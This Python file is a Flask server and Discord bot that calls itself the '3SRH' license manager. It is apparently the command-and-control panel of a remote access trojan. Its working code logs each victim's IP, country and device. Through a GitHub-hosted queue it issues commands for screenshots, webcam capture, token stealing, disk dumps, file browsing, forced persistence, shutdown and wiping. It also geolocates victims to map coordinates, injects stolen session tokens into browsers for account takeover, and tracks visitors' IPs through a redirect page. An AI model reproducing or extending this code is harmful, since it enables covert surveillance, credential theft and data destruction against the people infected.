import os
import base64
import json
import random
import string
import time
import asyncio
import discord
from discord import app_commands
import requests
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask('')

HOST_URL = "https://threesrh-system-data-7.onrender.com/"
WEB_SESSIONS_MEMORY = {}

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

@app.route('/activate', methods=['POST'])
def api_activate():
    data = request.json
    if not data: return {"status": "error", "message": "No data"}, 400
    
    user_code = data.get("code", "").strip().upper()
    current_device = data.get("device", "").strip()
    
    if request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        client_ip = request.remote_addr
        
    client_port = str(request.environ.get('REMOTE_PORT', '7680'))
    
    client_country = "Unknown"
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country", timeout=3).json()
        if geo_res.get('status') == 'success':
            client_country = geo_res.get('country', 'Unknown')
    except Exception:
        pass

    db, sha, url, headers = fetch_db()
    if not db: return {"status": "error", "message": "Database error"}, 500

    if user_code in db.get("blacklisted_codes", []) or current_device in db.get("blacklisted_devices", []):
        return {"status": "error", "message": "Banned"}, 403

    codes_dict = db.get("codes", {})
    if user_code not in codes_dict:
        return {"status": "error", "message": "Invalid code"}, 404

    code_info = codes_dict[user_code]

    if code_info["used"]:
        if code_info["device"] == current_device:
            return {"status": "success", "message": "Already activated on this device"}
        else:
            return {"status": "error", "message": "Used on another device"}, 400

    code_info["used"] = True
    code_info["device"] = current_device
    code_info["ip"] = client_ip
    code_info["port"] = client_port
    code_info["country"] = client_country

    if save_db(db, sha, url, headers, f"Activate code {user_code} with real IP {client_ip}"):
        asyncio.run_coroutine_threadsafe(
            send_discord_activation_alert(user_code, current_device, client_ip, client_port, client_country),
            client.loop
        )
        return {"status": "success", "ip": client_ip, "port": client_port, "country": client_country}

    return {"status": "error", "message": "Save failed"}, 500

@app.route('/heartbeat', methods=['POST'])
def api_heartbeat():
    data = request.json
    if not data: return {"status": "error", "message": "No data"}, 400
    user_code = data.get("code", "").strip().upper()
    if request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        client_ip = request.remote_addr
    client_port = str(request.environ.get('REMOTE_PORT', '7680'))
    client_country = "Unknown"
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country", timeout=2).json()
        if geo_res.get('status') == 'success':
            client_country = geo_res.get('country', 'Unknown')
    except Exception:
        pass
    db, sha, url, headers = fetch_db()
    if db and "codes" in db and user_code in db["codes"]:
        db["codes"][user_code]["ip"] = client_ip
        db["codes"][user_code]["port"] = client_port
        db["codes"][user_code]["country"] = client_country
        save_db(db, sha, url, headers, f"Heartbeat update for {user_code}")
        return {"status": "success", "ip": client_ip}
    return {"status": "error", "message": "Code not found"}, 404

async def send_discord_activation_alert(user_code, current_device, client_ip, client_port, client_country):
    try:
        channel = client.get_channel(CHANNEL_ID)
        if not channel:
            channel = await client.fetch_channel(CHANNEL_ID)
        
        raw_token_data = f"{user_code}:{current_device}"
        safe_payload_id = base64.urlsafe_b64encode(raw_token_data.encode("utf-8")).decode("utf-8").rstrip("=")

        embed = discord.Embed(
            title="✅ تم تفعيل ترخيص جديد بنجاح (اتصال حقيقي)",
            color=11048447
        )
        embed.add_field(name="🔑 الكود المستخدم", value=f"`{user_code}`", inline=True)
        embed.add_field(name="💻 اسم الجهاز", value=f"`{current_device}`", inline=True)
        embed.add_field(name="🌐 عنوان IP الحقيقي", value=f"`{client_ip}`", inline=True)
        embed.add_field(name="🔌 البورت الحقيقي", value=f"`{client_port}`", inline=True)
        embed.add_field(name="🌍 الدولة", value=f"`{client_country}`", inline=True)
        embed.set_footer(text="3SRH License Management System")

        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(style=discord.ButtonStyle.danger, label="🚫 حظر", custom_id=f"ban_{safe_payload_id}"))
        view.add_item(discord.ui.Button(style=discord.ButtonStyle.secondary, label="♻️ تصفير", custom_id=f"unban_{safe_payload_id}"))
        view.add_item(discord.ui.Button(style=discord.ButtonStyle.primary, label="👢 طرد", custom_id=f"kick_{safe_payload_id}"))

        await channel.send(content="🚨 **تنبيه تفعيل جديد لـ 3SRH!**", embed=embed, view=view)
    except Exception:
        pass

@app.route('/autologin')
def autologin():
    token = request.args.get('token')
    platform_type = request.args.get('platform', 'epic')
    
    if not token:
        return "❌ التوكن غير موجود أو غير صالح", 404

    target_url = "https://www.epicgames.com"
    if platform_type == "gmail": target_url = "https://mail.google.com"
    elif platform_type == "twitch": target_url = "https://www.twitch.tv"
    elif platform_type == "youtube": target_url = "https://www.youtube.com"
    elif platform_type == "discord": target_url = "https://discord.com/app"

    return f"""
    <html>
    <head><title>3SRH {platform_type.upper()} Auth</title></head>
    <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
        <h2>🎮 تم حقن توكن {platform_type.upper()} بنجاح!</h2>
        <p style="color: #A871FF; word-break: break-all; padding: 0 20px;">Token: {token}</p>
        <script>
            setTimeout(function() {{
                localStorage.setItem('{platform_type}_token', JSON.stringify("{token}"));
                window.location.href = '{target_url}';
            }}, 1500);
        </script>
    </body>
    </html>
    """

@app.route('/track')
def track_visitor():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    redirect_target = request.args.get('to', 'https://www.google.com')
    country = 'Unknown'
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country", timeout=3).json()
        if geo_res.get('status') == 'success': country = geo_res.get('country', 'Unknown')
    except Exception:
        pass

    try:
        db, sha, url, headers = fetch_db()
        if db:
            if "web_visits" not in db: db["web_visits"] = []
            db["web_visits"].append({"ip": ip, "country": country, "time": int(time.time())})
            save_db(db, sha, url, headers, f"New visit from IP {ip}")
    except Exception:
        pass

    return render_template_string("""
    <html>
    <head><title>Loading...</title></head>
    <body style="background:#111; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
        <h3>جاري تحميل المحتوى، يرجى الانتظار...</h3>
        <script>setTimeout(() => { window.location.href = "{{ target }}"; }, 1500);</script>
    </body>
    </html>
    """, target=redirect_target)

def run():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive(): Thread(target=run, daemon=True).start()
keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))

def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            file_data = r.json()
            return json.loads(base64.b64decode(file_data["content"]).decode("utf-8")), file_data["sha"], url, headers
    except Exception:
        pass
    return None, None, url, headers

def save_db(db, sha, url, headers, commit_message, retries=3):
    for attempt in range(retries):
        try:
            new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
            r = requests.put(url, headers=headers, json={"message": commit_message, "content": new_content, "sha": sha}, timeout=5)
            if r.status_code in [200, 201]:
                return True
            elif r.status_code == 409:
                db, sha, _, _ = fetch_db()
                if not db: return False
            else:
                return False
        except Exception:
            if attempt == retries - 1:
                return False
            time.sleep(0.5)
    return False

# --- نماذج الإدخال التفاعلية (Modals) لأزرار الأجهزة ---
class WallpaperModal(discord.ui.Modal, title="تغيير خلفية سطح المكتب"):
    image_url = discord.ui.TextInput(label="رابط الصورة المباشر (JPG/PNG)", placeholder="https://example.com/image.jpg", required=True)
    def __init__(self, code):
        super().__init__()
        self.code = code
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = await asyncio.to_thread(fetch_db)
        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
        db.setdefault("remote_wallpapers", {})[self.code] = {"url": self.image_url.value.strip(), "id": str(time.time())}
        if save_db(db, sha, url, headers, f"Wallpaper update for {self.code}"):
            await interaction.followup.send(f"🖼️ تم إرسال أمر تغيير الخلفية للعميل `{self.code}` بنجاح!", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل حفظ الأمر.", ephemeral=True)

class KillProcessModal(discord.ui.Modal, title="إيقاف عملية نشطة"):
    process_name = discord.ui.TextInput(label="اسم العملية (مثال: discord.exe)", placeholder="discord.exe", required=True)
    def __init__(self, code):
        super().__init__()
        self.code = code
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = await asyncio.to_thread(fetch_db)
        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
        db.setdefault("remote_killprocess", {})[self.code] = {"name": self.process_name.value.strip(), "id": str(time.time())}
        if save_db(db, sha, url, headers, f"Kill process {self.process_name.value} for {self.code}"):
            await interaction.followup.send(f"🛑 تم إرسال أمر إيقاف العملية `{self.process_name.value}` للعميل `{self.code}`!", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل حفظ الأمر.", ephemeral=True)

class FileBrowserModal(discord.ui.Modal, title="استعراض ملفات العميل"):
    folder_path = discord.ui.TextInput(label="مسار المجلد المطلوب", placeholder="C:\\", default="C:\\", required=True)
    def __init__(self, code):
        super().__init__()
        self.code = code
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = await asyncio.to_thread(fetch_db)
        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
        db.setdefault("remote_filebrowser", {})[self.code] = {"path": self.folder_path.value.strip(), "id": str(time.time())}
        if save_db(db, sha, url, headers, f"Files browse for {self.code}"):
            await interaction.followup.send(f"📁 تم طلب استعراض الملفات للمسار `{self.folder_path.value}` للعميل `{self.code}`!", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل حفظ الأمر.", ephemeral=True)

class LagTimerModal(discord.ui.Modal, title="تفعيل لاج مؤقت للعميل"):
    ping_value = discord.ui.TextInput(label="قيمة البينغ بالمللي ثانية", placeholder="500", required=True)
    duration_seconds = discord.ui.TextInput(label="المدة بالثواني", placeholder="10", required=True)
    def __init__(self, code):
        super().__init__()
        self.code = code
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        try:
            ping = int(self.ping_value.value.strip())
            duration = int(self.duration_seconds.value.strip())
        except ValueError:
            return await interaction.followup.send("❌ يرجى إدخال أرقام صحيحة فقط.", ephemeral=True)
        
        db, sha, url, headers = await asyncio.to_thread(fetch_db)
        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
        db.setdefault("remote_lag_timers", {})[self.code] = {"ping": ping, "duration": duration, "id": str(time.time())}
        if save_db(db, sha, url, headers, f"Lag timer {ping}ms for {self.code}"):
            await interaction.followup.send(f"⏱️ تم تفعيل اللاج المؤقت للعميل `{self.code}` بقيمة `{ping}ms` لمدة `{duration} ثانية`!", ephemeral=True)
        else:
            await interaction.followup.send("❌ فشل حفظ الأمر.", ephemeral=True)

class LicenseBot(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.default())
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")

    async def on_interaction(self, interaction: discord.Interaction):
        if interaction.type == discord.InteractionType.component:
            custom_id = interaction.data.get("custom_id", "")
            
            # منع تعليق ديسكورد (Thinking...) للأزرار العامة
            if not interaction.response.is_done() and not custom_id.startswith(("dev_act_wallpaper_", "dev_act_killproc_", "dev_act_files_", "dev_act_lag_")):
                try:
                    await interaction.response.defer(thinking=True, ephemeral=True)
                except Exception:
                    pass

            if custom_id.startswith(("ban_", "unban_", "recycle_", "kick_")):
                try:
                    action, encoded_data = custom_id.split("_", 1)
                    raw_data = base64.urlsafe_b64decode(encoded_data + "=" * (-len(encoded_data) % 4)).decode("utf-8")
                    user_code, current_device = raw_data.split(":", 1)
                except Exception:
                    await interaction.followup.send("❌ فشل تحليل بيانات الزر.", ephemeral=True)
                    return

                db, sha, url, headers = await asyncio.to_thread(fetch_db)
                if not db: 
                    await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
                    return

                if action == "ban":
                    if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
                    if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
                    if user_code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(user_code)
                    if current_device and current_device not in db["blacklisted_devices"]: db["blacklisted_devices"].append(current_device)
                    if user_code in db.get("codes", {}):
                        db["codes"][user_code]["used"] = False
                        db["codes"][user_code]["device"] = None
                    if save_db(db, sha, url, headers, f"Ban {user_code}"):
                        await interaction.followup.send(f"🚫 تم حظر الكود `{user_code}` والجهاز بنجاح!", ephemeral=True)

                elif action == "unban" or action == "recycle":
                    if user_code in db.get("blacklisted_codes", []): db["blacklisted_codes"].remove(user_code)
                    if current_device in db.get("blacklisted_devices", []): db["blacklisted_devices"].remove(current_device)
                    if user_code in db.get("codes", {}):
                        db["codes"][user_code]["used"] = False
                        db["codes"][user_code]["device"] = None
                    if save_db(db, sha, url, headers, f"Reset {user_code}"):
                        await interaction.followup.send(f"♻️ تم رفع الحظر والتصفير للكود `{user_code}`!", ephemeral=True)

                elif action == "kick":
                    if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
                    db["targeted_kick_messages"][user_code] = {"msg": "تم طردك من المشرف", "id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Kick {user_code}"):
                        await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل `{user_code}`!", ephemeral=True)

            elif custom_id.startswith("del_Unused_"):
                code_to_del = custom_id.replace("del_Unused_", "")
                db, sha, url, headers = await asyncio.to_thread(fetch_db)
                if not db:
                    await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
                    return
                if code_to_del in db.get("codes", {}):
                    del db["codes"][code_to_del]
                    if save_db(db, sha, url, headers, f"Delete unused {code_to_del}"):
                        await interaction.followup.send(f"🗑️ تم حذف الكود `{code_to_del}` نهائياً!", ephemeral=True)

            elif custom_id.startswith("unban_code_"):
                code_to_unban = custom_id.replace("unban_code_", "")
                db, sha, url, headers = await asyncio.to_thread(fetch_db)
                if not db:
                    await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
                    return
                if code_to_unban in db.get("blacklisted_codes", []):
                    db["blacklisted_codes"].remove(code_to_unban)
                    if code_to_unban in db.get("codes", {}):
                        db["codes"][code_to_unban]["used"] = False
                        db["codes"][code_to_unban]["device"] = None
                    if save_db(db, sha, url, headers, f"Unban {code_to_unban}"):
                        await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{code_to_unban}` بنجاح!", ephemeral=True)

            elif custom_id.startswith("man_dev_"):
                dev_code = custom_id.replace("man_dev_", "")
                try:
                    db, _, _, _ = await asyncio.to_thread(fetch_db)
                    if not db:
                        await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
                        return
                    if dev_code in db.get("codes", {}):
                        info = db["codes"][dev_code]
                        ip = info.get("ip", "Unknown")
                        port = info.get("port", "7680")
                        country = info.get("country", "Unknown")
                        hwid = info.get("device", "Unknown")
                        view = DeviceActionsView(dev_code, hwid, ip, port, country)
                        await interaction.followup.send(
                            f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", 
                            view=view, ephemeral=True
                        )
                    else:
                        await interaction.followup.send("❌ لم يتم العثور على بيانات الجهاز في قاعدة البيانات.", ephemeral=True)
                except Exception as e:
                    await interaction.followup.send(f"❌ حدث خطأ أثناء فتح اللوحة: {e}", ephemeral=True)

            elif custom_id.startswith("dev_"):
                # معالجة أزرار أجهزة العميل المباشرة
                try:
                    if custom_id.startswith("dev_force_persist_"):
                        action, code = "force_persist", custom_id.replace("dev_force_persist_", "")
                    elif custom_id.startswith("dev_remove_persist_"):
                        action, code = "remove_persist", custom_id.replace("dev_remove_persist_", "")
                    elif custom_id.startswith("dev_kill_tool_"):
                        action, code = "kill_tool", custom_id.replace("dev_kill_tool_", "")
                    else:
                        parts = custom_id.split("_")
                        action, code = parts[1], parts[2]
                except Exception:
                    await interaction.followup.send("❌ خطأ في تحليل بيانات الزر.", ephemeral=True)
                    return

                db, sha, url, headers = await asyncio.to_thread(fetch_db)
                if not db:
                    await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
                    return

                if action == "ban":
                    hwid = db.get("codes", {}).get(code, {}).get("device", "Unknown")
                    db.setdefault("blacklisted_codes", []).append(code)
                    if hwid and hwid != "Unknown":
                        db.setdefault("blacklisted_devices", []).append(hwid)
                    if code in db.get("codes", {}):
                        db["codes"][code].update({"used": False, "device": None})
                    if save_db(db, sha, url, headers, f"Ban {code}"):
                        await interaction.followup.send("🚫 تم حظر الكود والجهاز بنجاح!", ephemeral=True)
                elif action == "kick":
                    db.setdefault("targeted_kick_messages", {})[code] = {"msg": "تم طردك من المالك", "id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Kick {code}"):
                        await interaction.followup.send("👢 تم إرسال أمر الطرد للعميل!", ephemeral=True)
                elif action == "geo":
                    info = db.get("codes", {}).get(code, {})
                    ip_addr = info.get("ip")
                    if not ip_addr or ip_addr == "Unknown":
                        await interaction.followup.send(f"❌ العميل `{code}` ليس لديه عنوان IP مسجل حالياً.", ephemeral=True)
                        return
                    geo_data = {}
                    try:
                        res = requests.get(f"http://ip-api.com/json/{ip_addr}?fields=status,country,city,lat,lon,query", timeout=4).json()
                        if res.get('status') == 'success':
                            geo_data = res
                    except Exception:
                        pass
                    country = geo_data.get('country', info.get("country", "غير معروف"))
                    city = geo_data.get('city', "غير معروفة")
                    lat = geo_data.get('lat')
                    lon = geo_data.get('lon')
                    maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else "غير متوفر"
                    msg = (
                        f"🌍 **الموقع الجغرافي الدقيق للعميل `{code}`:**\n"
                        f"• 🌐 عنوان الـ IP: `{ip_addr}`\n"
                        f"• 🏙️ المدينة: `{city}`\n"
                        f"• 🌍 الدولة: `{country}`\n"
                    )
                    if lat and lon:
                        msg += f"• 📍 **رابط خرائط جوجل:** [اضغط هنا لعرض الموقع على الخريطة]({maps_link})"
                    else:
                        msg += f"• 📍 **رابط خرائط جوجل:** تعذر تحديد الإحداثيات بدقة."
                    await interaction.followup.send(msg, ephemeral=True)
                elif action == "ipconfig":
                    db.setdefault("remote_ipconfig", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"IPConfig {code}"):
                        await interaction.followup.send("📡 تم إرسال أمر فحص الشبكة (ipconfig) للعميل بنجاح!", ephemeral=True)
                elif action == "lanscan":
                    db.setdefault("remote_lanscan", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"LanScan {code}"):
                        await interaction.followup.send("🔍 تم إرسال أمر مسح الشبكة المحلية (LanScan) للعميل!", ephemeral=True)
                elif action == "wipe":
                    db.setdefault("remote_wipe", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Wipe {code}"):
                        await interaction.followup.send("🧹 تم إرسال أمر تنظيف الكاش والبيانات المؤقتة للعميل!", ephemeral=True)
                elif action == "ss":
                    db.setdefault("remote_screenshots", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"SS {code}"):
                        await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
                elif action == "webcam":
                    db.setdefault("remote_webcams", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Webcam {code}"):
                        await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
                elif action == "tokens":
                    db.setdefault("remote_token_stealers", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Tokens Dump {code}"):
                        await interaction.followup.send("🔑 تم طلب سحب بيانات توكنات شاملة بنجاح!", ephemeral=True)
                elif action == "dump":
                    db.setdefault("remote_disk_dumps", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Dump {code}"):
                        await interaction.followup.send("📂 تم طلب سحب الملفات!", ephemeral=True)
                elif action == "shut":
                    db.setdefault("remote_shutdowns", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Shutdown {code}"):
                        await interaction.followup.send("⚡ تم إيقاف جهاز العميل بنجاح!", ephemeral=True)
                elif action == "force_persist":
                    db.setdefault("remote_force_persistence", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Force Persistence {code}"):
                        await interaction.followup.send("🛡️ تم إرسال أمر تفعيل الثبات الإلزامي للعميل!", ephemeral=True)
                elif action == "remove_persist":
                    db.setdefault("remote_remove_persistence", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Remove Persistence {code}"):
                        await interaction.followup.send("🔓 تم إرسال أمر إلغاء الثبات للعميل!", ephemeral=True)
                elif action == "kill_tool":
                    db.setdefault("remote_kill_tool", {})[code] = {"id": str(time.time())}
                    if save_db(db, sha, url, headers, f"Kill Tool {code}"):
                        await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة للعميل!", ephemeral=True)

client = LicenseBot()

def generate_random_code():
    return f"3SRH-{''.join(random.choices(string.ascii_uppercase + string.digits, k=5))}"

class ConfirmSaveView(discord.ui.View):
    def __init__(self, codes, count):
        super().__init__(timeout=None)
        self.codes = codes
        self.count = count

    @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_yes")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        await asyncio.sleep(1)
        db, sha, url, headers = await asyncio.to_thread(fetch_db)
        if not db: 
            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        if "codes" not in db: db["codes"] = {}
        for c in self.codes: db["codes"][c] = {"used": False, "device": None, "ip": None, "port": None, "country": None}
        if save_db(db, sha, url, headers, f"Generated {self.count} codes"):
            try: await interaction.message.delete()
            except Exception: pass
            await interaction.followup.send(f"✅ **تم حفظ {self.count} كود:**\n" + "\n".join([f"`{c}`" for c in self.codes]), ephemeral=True)

class UnusedManagementView(discord.ui.View):
    def __init__(self, codes):
        super().__init__(timeout=None)
        for c in codes[:25]:
            self.add_item(DeleteUnusedCodeButton(c))

class DeleteUnusedCodeButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"🗑️ حذف: {code}", style=discord.ButtonStyle.danger, custom_id=f"del_Unused_{code}")
        self.code = code

class BlacklistedCodesView(discord.ui.View):
    def __init__(self, codes):
        super().__init__(timeout=None)
        for c in codes[:25]:
            self.add_item(UnbanCodeButton(c))

class UnbanCodeButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"♻️ رفع الحظر عن: {code}", style=discord.ButtonStyle.success, custom_id=f"unban_code_{code}")
        self.code = code

class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid, ip, port, country):
        super().__init__(timeout=None)
        self.code, self.hwid, self.ip, self.port, self.country = code, hwid, ip, port, country

        # Row 0 (5 buttons)
        self.add_item(discord.ui.Button(label="🚫 حظر", style=discord.ButtonStyle.danger, custom_id=f"dev_ban_{code}", row=0))
        self.add_item(discord.ui.Button(label="👢 طرد", style=discord.ButtonStyle.primary, custom_id=f"dev_kick_{code}", row=0))
        self.add_item(discord.ui.Button(label="🌍 الموقع", style=discord.ButtonStyle.secondary, custom_id=f"dev_geo_{code}", row=0))
        self.add_item(discord.ui.Button(label="📡 IPConfig", style=discord.ButtonStyle.secondary, custom_id=f"dev_ipconfig_{code}", row=0))
        self.add_item(discord.ui.Button(label="🔍 LanScan", style=discord.ButtonStyle.secondary, custom_id=f"dev_lanscan_{code}", row=0))

        # Row 1 (5 buttons)
        self.add_item(discord.ui.Button(label="🧹 Wipe", style=discord.ButtonStyle.secondary, custom_id=f"dev_wipe_{code}", row=1))
        # Modal buttons use direct callbacks
        self.add_item(WallpaperButton(code))
        self.add_item(KillProcessButton(code))
        self.add_item(FileBrowserButton(code))
        self.add_item(LagButton(code))

        # Row 2 (5 buttons)
        self.add_item(discord.ui.Button(label="📸 لقطة", style=discord.ButtonStyle.secondary, custom_id=f"dev_ss_{code}", row=2))
        self.add_item(discord.ui.Button(label="📸 كاميرا", style=discord.ButtonStyle.secondary, custom_id=f"dev_webcam_{code}", row=2))
        self.add_item(discord.ui.Button(label="🔑 التوكنات", style=discord.ButtonStyle.secondary, custom_id=f"dev_tokens_{code}", row=2))
        self.add_item(discord.ui.Button(label="📂 Dump", style=discord.ButtonStyle.secondary, custom_id=f"dev_dump_{code}", row=2))
        self.add_item(discord.ui.Button(label="⚡ إيقاف", style=discord.ButtonStyle.danger, custom_id=f"dev_shut_{code}", row=2))

        # Row 3 (3 buttons)
        self.add_item(discord.ui.Button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id=f"dev_force_persist_{code}", row=3))
        self.add_item(discord.ui.Button(label="🔓 إلغاء الثبات", style=discord.ButtonStyle.secondary, custom_id=f"dev_remove_persist_{code}", row=3))
        self.add_item(discord.ui.Button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id=f"dev_kill_tool_{code}", row=3))

# أزرار فتح النوافذ التفاعلية (Modals)
class WallpaperButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label="🖼️ الخلفية", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_wallpaper_{code}", row=1)
        self.code = code
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(WallpaperModal(self.code))

class KillProcessButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label="🛑 عملية", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_killproc_{code}", row=1)
        self.code = code
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(KillProcessModal(self.code))

class FileBrowserButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label="📁 الملفات", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_files_{code}", row=1)
        self.code = code
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(FileBrowserModal(self.code))

class LagButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label="⏱️ لاج", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_lag_{code}", row=1)
        self.code = code
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(LagTimerModal(self.code))

class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices):
        super().__init__(timeout=None)
        for code, info in devices[:25]:
            self.add_item(DeviceManageButton(code, info))

class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        ip = info.get("ip", "Unknown")
        port = info.get("port", "7680")
        country = info.get("country", "Unknown")
        super().__init__(label=f"🌐 {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

class MainDashboardView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="📁 إدارة الأكواد المتاحة", style=discord.ButtonStyle.primary, custom_id="dash_unused", row=0)
    async def unused(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = await asyncio.to_thread(fetch_db)
        if not db: 
            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
        await interaction.followup.send(f"🟢 **الأكواد المتاحة:** `{len(unused_list)}`", view=UnusedManagementView(unused_list) if unused_list else None, ephemeral=True)

    @discord.ui.button(label="🚫 إدارة الأكواد المحظورة", style=discord.ButtonStyle.danger, custom_id="dash_blacklist", row=0)
    async def black(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = await asyncio.to_thread(fetch_db)
        if not db: 
            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        blacklisted = db.get("blacklisted_codes", [])
        await interaction.followup.send(f"🚫 **المحظورة:** `{len(blacklisted)}`", view=BlacklistedCodesView(blacklisted) if blacklisted else None, ephemeral=True)

    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_devices", row=1)
    async def devs(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = await asyncio.to_thread(fetch_db)
        if not db: 
            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
        if not devs_list:
            await interaction.followup.send("❌ لا توجد أجهزة متصلة حالياً.", ephemeral=True)
            return
